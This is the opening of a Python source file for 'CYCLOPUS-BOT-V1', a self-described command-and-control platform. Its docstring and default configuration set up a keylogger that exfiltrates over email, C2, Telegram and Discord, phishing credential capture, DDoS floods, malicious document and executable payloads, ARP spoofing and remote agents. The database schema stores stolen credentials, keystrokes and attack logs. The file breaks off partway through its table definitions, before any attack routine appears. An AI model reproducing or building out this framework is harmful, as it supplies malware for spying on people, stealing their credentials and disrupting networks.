#!/usr/bin/env python3
"""
🐙 CYCLOPUS-BOT-V1 - Cybersecurity Command & Control Platform
Author: Ian Carter Kulani, MSc
Version: 1.0.0

A complete cybersecurity automation platform featuring:
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, iMessage, Web)
- Advanced Network Scanning & Pentesting
- Keylogger with Screenshot Capture & Exfiltration
- Social Engineering Suite with 100+ Phishing Templates
- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP/SYN/ACK/FIN Floods)
- Advanced IP Monitoring & Threat Detection
- Stunning Gradient Web Dashboard (Cyan, Purple, Blue)
- DDoS/DoS Attack Module with Multiple Attack Vectors
- Agent Mode for Remote Control with Heartbeat
- Payload Generation & Deployment (EXE, PDF, DOCX, Link, Network)
- Graphical Reports & Statistics (Bar & Pie Charts)
- Spear Phishing Module with Email Tracking
- SSH Remote Access via All Platforms
- Password Cracking Engine (Hashcat Integration)
- ARP Spoofing & Network Manipulation
- MAC Address Management
- NAT Information
- AI Transformer Engine
- Terminal Animations
- Email Composition & Sending
- PDF Report Generation
- Docker Security Scanning
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
import ctypes
import queue
import secrets
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "CYCLOPUS-BOT-V1"
AUTHOR = "Ian Carter Kulani, MSc"
DESCRIPTION = "Cybersecurity Command & Control Platform"


# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Colorama (Gradient Theme)
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# GRADIENT THEME (Cyan, Purple, Blue)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        CYAN = Fore.CYAN + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        LIGHTBLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
        LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
        LIGHTMAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        LIGHTYELLOW = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_CYAN = Back.CYAN + Fore.BLACK
        BG_PURPLE = Back.MAGENTA + Fore.WHITE
        BG_BLUE = Back.BLUE + Fore.WHITE
        BG_BLACK = Back.BLACK + Fore.CYAN
else:
    class Colors:
        CYAN = PURPLE = BLUE = GREEN = YELLOW = RED = WHITE = BLACK = MAGENTA = LIGHTBLUE = LIGHTCYAN = LIGHTMAGENTA = LIGHTYELLOW = RESET = BG_CYAN = BG_PURPLE = BG_BLUE = BG_BLACK = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".cyclopus_bot_v1"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "cyclopus_bot_v1.db")
LOG_FILE = os.path.join(CONFIG_DIR, "cyclopus_bot_v1.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "cyclopus_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
ANIMATION_CACHE_DIR = os.path.join(CONFIG_DIR, "animation_cache")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
TEMPLATES_DIR = os.path.join(CONFIG_DIR, "templates")
CUSTOM_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "custom_templates")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, 
    NAT_LOGS_DIR, ANIMATION_CACHE_DIR, PLATFORM_LOGS_DIR,
    DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR, PDF_REPORTS_DIR,
    TEMPLATES_DIR, CUSTOM_TEMPLATES_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CYCLOPUS-BOT-V1 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("CyclopusBotV1")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    TCP_PSH_ACK = "tcp_psh_ack"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"
    NIKTO = "nikto"
    ALL = "all"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"
    MATRIX = "matrix"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class MonitoredIP:
    ip: str
    domain: Optional[str]
    open_ports: List[int]
    closed_ports: List[int]
    last_scan: str
    threat_level: str
    alert_count: int
    is_blocked: bool
    hostname: Optional[str]
    os_info: Optional[str]

@dataclass
class KeylogEntry:
    id: int
    timestamp: str
    text: str
    session_id: str
    app_name: str
    hostname: str
    screenshot_path: Optional[str]

@dataclass
class Payload:
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

@dataclass
class ARPSpoofResult:
    target_ip: str
    gateway_ip: str
    interface: str
    status: str
    packets_sent: int
    duration: float
    started_at: str
    ended_at: str

@dataclass
class MACInfo:
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "html",
        "generate_graphics": True,
        "animations": {
            "enabled": True,
            "startup": "matrix_rain",
            "loading": "spinner",
            "success": "pulse",
            "error": "glitch",
            "duration": 2.0
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200,
            "scan_interval": 300,
            "max_ips": 10000
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "",
            "wordlist_path": "",
            "default_hash_type": 0,
            "max_threads": 4
        },
        "arp_spoofing": {
            "enabled": True,
            "interface": "eth0",
            "enable_ip_forward": True,
            "sniff_interval": 60
        },
        "transformer": {
            "enabled": True,
            "max_input_length": 1000,
            "cache_size": 100
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        },
        "platform": {
            "enabled": True,
            "parallel_execution": False,
            "timeout": 30,
            "retry_count": 3
        },
        "reports": {
            "enabled": True,
            "pdf_enabled": True,
            "json_enabled": True,
            "auto_generate": False
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                hostname TEXT,
                os_info TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level TEXT DEFAULT 'low',
                alert_count INTEGER DEFAULT 0,
                open_ports TEXT,
                closed_ports TEXT,
                last_scan DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1,
                scan_data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                session_id TEXT,
                app_name TEXT,
                hostname TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing (
                id TEXT PRIMARY KEY,
                target_email TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                template TEXT,
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'sent',
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                tracking_id TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ddos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                attack_type TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                threads INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                hostname TEXT,
                ip_address TEXT,
                os_info TEXT,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'online',
                heartbeat INTEGER DEFAULT 60
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0,
                deployment_count INTEGER DEFAULT 0,
                callback_host TEXT,
                callback_port INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payload_deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT NOT NULL,
                deployment_type TEXT NOT NULL,
                target TEXT,
                deployed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (payload_id) REFERENCES payloads(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME,
                UNIQUE(target_ip, gateway_ip)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
